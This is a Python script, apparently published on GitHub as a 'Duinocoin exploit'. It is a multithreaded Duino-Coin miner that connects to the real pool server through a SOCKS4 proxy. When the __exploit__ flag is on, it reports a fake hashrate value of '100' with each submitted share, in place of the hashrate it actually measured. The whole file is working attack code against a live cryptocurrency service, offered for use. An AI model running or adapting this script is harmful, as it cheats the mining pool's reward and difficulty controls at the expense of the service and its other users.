# Made by github.com/its-vichy
# https://github.com/Its-Vichy/Dunocoin-Exploit

# ---> Using proxy.
# ---> CPU Mining.

import threading, urllib.request, time, json, socks, itertools, hashlib

__user__, __proxy__, __debug_mod__ = 'its_vichy', '127.0.0.1:1080', True

__exploit__, __fake_hash__ = True, "100"

def debug(content: str) -> None:
    if __debug_mod__:
        print(content)

class MinerThread(threading.Thread):
    def __init__(self) -> None:
        self.socket = socks.socksocket()
        self.socket.set_proxy(socks.PROXY_TYPE_SOCKS4, addr= __proxy__.split(':')[0], port= int(__proxy__.split(':')[1]))

        self.diffs = itertools.cycle(['LOW', 'MEDIUM', 'HIGH'])
        threading.Thread.__init__(self)

    def get_pool(self) -> dict:
        while True:
            try:
                response = json.loads(urllib.request.urlopen(urllib.request.Request('https://server.duinocoin.com/getPool')).read().decode('utf-8'))
                return response['ip'], int(response['port'])
            except:
                return 'server.duinocoin.com', 2813

    def request_job(self, diff: str) -> list:
        self.socket.send(bytes(f'JOB,{__user__},{diff},PuffMiner', encoding='utf-8'))
        return self.socket.recv(1024).decode('utf-8').rstrip('\n').split(',')

    def submit_hash(self, result: str, hashrate: str) -> bool:
        self.socket.send(bytes(f'{result},{hashrate},PuffMiner', encoding='utf-8'))
        return True if self.socket.recv(1024).decode().rstrip("\n") == 'GOOD' else False

    def run(self) -> None:
        ip, port = self.get_pool()
        actual_diff = next(self.diffs)
        
        while True:
            self.socket.connect((ip, port))
            self.socket.recv(100).decode() # server_version

            while True:
                job = self.request_job(actual_diff)
                
                if job[0] == 'BAD':
                    actual_diff = next(self.diffs)
                    debug(f'[*] Diff changed --> {actual_diff}')
                else:
                    hashingStartTime = time.time()
                    base_hash = hashlib.sha1(str(job[0]).encode('ascii'))
                    temp_hash = None

                    for result in range(100 * int(job[2])+1):
                        temp_hash = base_hash.copy()
                        temp_hash.update(str(result).encode('ascii'))
                        ducos1 = temp_hash.hexdigest()
                        
                        if job[1] == ducos1:
                            hashingStopTime = time.time()
                            timeDifference = hashingStopTime - hashingStartTime
                            hashrate = result / timeDifference
                            
                            res = self.submit_hash(result, __fake_hash__) if __exploit__ else self.submit_hash(result, hashrate)

                            if res:
                                debug(f'[+] Submited [{result}] [{str(hashrate/1000).split(".")[0]}kH/s] [{actual_diff}]')
                                break
                            else:
                                print('[-] Bad result')
                                break

if __name__ == '__main__':
    for _ in range(4):
        MinerThread().start()